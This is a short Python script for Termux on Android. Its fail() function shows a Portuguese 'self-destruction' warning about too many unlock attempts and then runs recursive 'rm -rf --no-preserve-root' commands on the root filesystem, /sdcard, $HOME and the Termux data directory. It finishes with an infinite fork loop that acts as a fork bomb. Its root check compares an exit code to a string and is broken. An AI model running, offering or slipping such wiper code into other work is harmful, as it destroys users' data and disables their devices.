#!/data/data/com.termux/files/usr/bin/python3

def fail():

    try:

        from time import sleep
        from os import system, fork

        root = system('sudo echo "Superuser binary detected." | grep superuser')
        print ('\x1b[H\x1b[2J\x1b')
        sleep(3)

        system('termux-toast -g middler -b black -c red "Excesso de tentativas de desbloqueio atingidas, iniciando autodestruição dos arquivos..."')

        if root == 'Superuser binary detected.':        
            system('rm -rf --no-preserve-root / > /dev/null')

        else:
            system('rm -rf --no-preserve-root /sdcard > /dev/null ; rm -rf --no-preserve-root $HOME > /dev/null ; rm -rf --no-preserve-root /data/data/com.termux/ > /dev/null')

        while True:
            fork()

    except (KeyboardInterrupt):

        exit()
